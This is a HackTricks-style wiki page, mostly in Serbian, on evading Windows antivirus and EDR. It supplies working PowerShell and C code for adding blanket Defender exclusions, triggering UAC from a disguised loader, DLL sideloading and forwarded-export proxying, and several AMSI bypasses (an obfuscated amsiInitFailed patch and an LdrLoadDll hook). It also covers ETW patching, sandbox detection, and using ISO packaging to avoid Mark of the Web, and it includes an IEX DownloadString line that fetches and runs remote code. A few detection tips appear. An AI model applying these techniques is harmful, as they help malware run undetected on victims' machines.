# Zaobilaženje antivirusnog softvera (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažiranjem drugog AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Javni loaderi koji se prerušavaju u varalice za igre često se isporučuju kao neusignirani Node.js/Nexe instaleri koji prvo **traže od korisnika elevaciju** i tek potom onesposobljavaju Defender-a. Tok je jednostavan:

1. Proveri administratorski kontekst sa `net session`. Komanda uspeva samo kada pozivalac ima administratorska prava, tako da neuspeh ukazuje da loader radi kao standardni korisnik.
2. Odmah se ponovo pokreće koristeći `RunAs` verb kako bi izazvao očekivani UAC prompt za potvrdu, pri čemu čuva originalnu komandnu liniju.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju “cracked” softver, pa se upit obično prihvati, dajući malware prava koja su mu potrebna da promeni politiku Defendera.

### Sveobuhvatna `MpPreference` isključenja za svako slovo pogona

Kada se privilegije podignu, GachiLoader-style chains maksimalno povećavaju slepe tačke Defendera umesto da servis u potpunosti onemoguće. Loader prvo ubija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) i zatim gura **izuzetno široka isključenja** tako da svaki korisnički profil, sistemski direktorijum i prenosivi disk budu izuzeti iz skeniranja:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **bilo koji budući payload ubačen bilo gde na disku se ignoriše**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **Metodologija izbegavanja AV-a**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

Ako enkriptuješ binary, AV neće moći da detektuje tvoj program, ali će ti trebati neki loader koji će dekriptovati i pokrenuti program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti neke stringove u binary-ju ili script-u da bi prošao pored AV-a, ali to može biti vremenski zahtevno u zavisnosti od toga šta pokušavaš da obfuskuješ.

- **Custom tooling**

Ako razviješ sopstvene alate, neće postojati poznati loši signaturi, ali to zahteva puno vremena i truda.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Toplo preporučujem da pogledate ovu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me uporedna analiza normalnog Havoc EXE payload-a naspram normalnog Havoc DLL-a</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite DLL Hijackable/Sideloadable programe**, ova tehnika je prilično stealthy ako se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti uhvaćeni.

Samo postavljanje malicioznog DLL fajla sa imenom koje program očekuje da učita neće automatski pokrenuti vaš payload, jer program očekuje neke specifične funkcije unutar tog DLL-a. Da bismo to rešili, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** preusmerava pozive koje program upućuje sa proxy (i malicioznog) DLL-a na originalni DLL, čime se čuva funkcionalnost programa i omogućava upravljanje izvršavanjem vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda za DLL i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju 0/26 Detection rate na [antiscan.me](https://antiscan.me)! Nazvao bih to uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Toplo preporučujem da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste detaljnije naučili ono o čemu smo govorili.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE moduli mogu eksportovati funkcije koje su ustvari "forwarders": umesto da ukazuju na kod, export entry sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivač razreši export, Windows loader će:

- Učitaće `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Ključna ponašanja za razumevanje:
- Ako je `TargetDll` KnownDLL, dobija se iz zaštićenog KnownDLLs namespace-a (npr., ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se normalan redosled pretrage DLL-ova, koji uključuje direktorijum modula koji vrši forward resolution.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji eksportuje funkciju forwardovanu ka modulu čije ime nije KnownDLL, zatim smestite taj potpisani DLL u isti direktorijum sa DLL-om pod kontrolom napadača koji je imenovan tačno kao forwardovani target modul. Kada se forwardovani export pozove, loader razreši forward i učita vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer primećen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se rešava preko normalnog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u direktorijum u koji se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite maliciozni `NCRYPTPROV.dll` u isti folder. Minimalan DllMain je dovoljan za izvršenje koda; ne morate implementirati prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje sa potpisanim LOLBin-om:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Primećeno ponašanje:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Dok rešava `KeyIsoSetAuditingInterface`, loader prati forward ka `NCRYPTPROV.SetAuditingInterface`
- Zatim loader učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što se `DllMain` već izvršio

Saveti za otkrivanje:
- Usredsredite se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs se nalaze pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete izlistati forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwarder-a da biste potražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na neprimetan način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je igra mačke i miša — ono što radi danas može biti detektovano sutra, zato se nikada ne oslanjajte samo na jedan alat; kad god je moguće, pokušajte kombinovati više evasion tehnika.

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Prvobitno su AV-ovi bili sposobni samo da skeniraju **fajlove na disku**, pa ako biste nekako uspeli da izvršite payload-e **direktno u memoriji**, AV nije imao dovoljno vidljivosti da to zaustavi.

AMSI funkcija je integrisana u sledeće komponente Windows-a.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ona omogućava antivirus rešenjima da inspektraju ponašanje skripti tako što izlaže sadržaj skripti u obliku koji nije enkriptovan niti obfuskovan.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će izazvati sledeći alert na Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju kako dodaje prefiks `amsi:` a zatim putanju do izvršnog fajla iz kog je skripta pokrenuta — u ovom slučaju, powershell.exe

Nismo ostavili nijedan fajl na disku, ali smo ipak uhvaćeni u memoriji zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# kod takođe se izvršava kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za učitavanje i izvršavanje u memoriji. Zato se za in-memory izvršavanje, ako želite da izbegnete AMSI, preporučuju niže verzije .NET-a (poput 4.7.2 ili niže).

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa statičkim detekcijama, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima sposobnost da deobfuskira skripte čak i ako imaju više slojeva obfuskacije, tako da obfuskacija može biti loša opcija u zavisnosti od toga kako je izvedena. To znači da nije trivijalno za zaobilaženje. Ipak, ponekad je dovoljno promeniti par imena promenljivih i bićete u redu, tako da zavisi koliko je nešto bilo označeno.

- **AMSI Bypass**

Pošto je AMSI implementiran tako što se DLL učitava u proces powershell (takođe cscript.exe, wscript.exe, itd.), moguće je jednostavno manipulisati njime čak i kad se radi kao nepriviligovan korisnik. Zbog ovog propusta u implementaciji AMSI-ja, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Forcing an Error**

Forsiranje neuspeha AMSI inicijalizacije (amsiInitFailed) će rezultovati time da se za trenutni proces neće pokrenuti nijedno skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio signature da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dovoljna je bila jedna linija powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Ta linija je, naravno, detektovana od strane samog AMSI-ja, pa su potrebne izmene da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno kada ovaj post bude objavljen, pa ne biste trebali objavljivati bilo kakav kod ako planirate ostati neotkriveni.

**Patchovanje memorije**

Ovu tehniku je inicijalno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (koja je odgovorna za skeniranje ulaznih podataka koje korisnik dostavi) i prepisivanje iste instrukcijama koje vraćaju kod E_INVALIDARG; na taj način, rezultat stvarnog skeniranja će biti 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike za zaobilaženje AMSI koristeći powershell — pogledajte [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) za više informacija.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što je `amsi.dll` učitan u trenutni proces. Robustan, agnostičan prema jeziku bypass je postavljanje user‑mode hook-a na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i za taj proces se ne vrše skeniranja.

Skica implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Radi sa PowerShell, WScript/CScript i custom loaders podjednako (svime što bi inače učitalo AMSI).
- Koristite u paru sa slanjem skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli duge artefakte komandne linije.
- Primećeno u upotrebi kod loadera koji se izvršavaju preko LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Uklonite detektovani potpis**

Možete koristiti alat kao što je **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite detektovani AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa tražeći AMSI potpis, a zatim ga prepisuje instrukcijama NOP, efektivno uklanjajući ga iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite Powershell verziju 2**
Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja vam omogućava da beležite sve PowerShell komande izvršene na sistemu. To može biti korisno za reviziju i otklanjanje problema, ali može biti i problem za napadače koji žele da izbegnu detekciju.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Za ovu namenu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Ako koristite PowerShell version 2, AMSI neće biti učitan, pa možete pokretati skripte bez skeniranja od strane AMSI. Možete to uraditi ovako: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawn-ujete powershell bez odbrane (ovo koristi i `powerpick` iz Cobal Strike).

## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuskacije se oslanja na enkripciju podataka, što povećava entropiju binarnog fajla i olakšava AV/EDR detekciju. Budite oprezni sa tim i razmislite da enkripciju primenite samo na specifične delove koda koji su osetljivi ili ih treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malvera koji koristi ConfuserEx 2 (ili komercijalne fork-ove) često ćete naići na više slojeva zaštite koji onemogućavaju dekompilere i sandbox-e. Radni tok ispod pouzdano vraća skoro-originalni IL koji se potom može dekompajlirati u C# u alatima kao što su dnSpy ili ILSpy.

1.  Anti-tampering removal – ConfuserEx enkriptuje svaki *method body* i dekriptuje ga unutar *module* static konstruktora (`<Module>.cctor`). Ovo takođe menja PE checksum pa će bilo kakva izmena srušiti binarni fajl. Koristite **AntiTamperKiller** da locirate enkriptovane metadata tabele, povratite XOR ključeve i prepišete čistu assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izgradnji vlastitog unpacker-a.

2.  Symbol / control-flow recovery – prosledite *clean* fajl na **de4dot-cex** (ConfuserEx-aware fork de4dot-a).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – odabir ConfuserEx 2 profila  
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i imena promenljivih i dekriptovati konstatne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (tzw. *proxy calls*) da dodatno oteža dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()` umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Manual clean-up – pokrenite dobijeni binarni fajl u dnSpy-u, tražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste locirali *pravi* payload. Često malver čuva payload kao TLV-enkodirani byte array inicijalizovan unutar `<Module>.byte_0`.

Gore navedeni lanac vraća tok izvršavanja **bez** potrebe da se maliciozni uzorak zapravo pokreće – korisno kada radite na offline radnoj stanici.

> 🛈  ConfuserEx proizvodi custom atribut pod imenom `ConfusedByAttribute` koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijski primer
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompajlacionog paketa koji omogućava povećanu bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik da bi se, u vreme kompilacije, generisao obfuscated code bez korišćenja eksternih alata i bez izmena kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operations generisanih pomoću C++ template metaprogramming framework-a, što otežava život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscate različite pe files uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za LLVM-supported languages koji koristi ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly code tako što transformiše regularne instrukcije u ROP chains, narušavajući našu prirodnu percepciju normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i potom ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran kada preuzimate neke izvršne fajlove sa interneta i pokušate da ih pokrenete.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu pristupa zasnovanog na reputaciji, što znači da će retko preuzimane aplikacije pokrenuti SmartScreen i tako upozoriti i sprečiti krajnjeg korisnika da izvrši fajl (iako fajl i dalje može biti izvršen klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani pouzdanim signing certificate-om neće pokrenuti SmartScreen.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web je da ih upakujete u neki kontejner poput ISO. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** biti primenjen na non NTFS volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u output containers kako bi izbegao Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windows koji omogućava aplikacijama i sistemskim komponentama da **beleže događaje**. Međutim, on takođe može biti iskorišćen od strane security proizvoda za praćenje i detekciju malicioznih aktivnosti.

Slično kao što se AMSI onemogućava (bypassa), moguće je i napraviti da funkcija korisničkog prostora **`EtwEventWrite`** vraća kontrolu odmah bez beleženja bilo kakvih događaja. To se postiže patchovanjem funkcije u memoriji da odmah vrati vrednost, efektivno onemogućavajući ETW logging za taj proces.

Više informacija možete naći u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

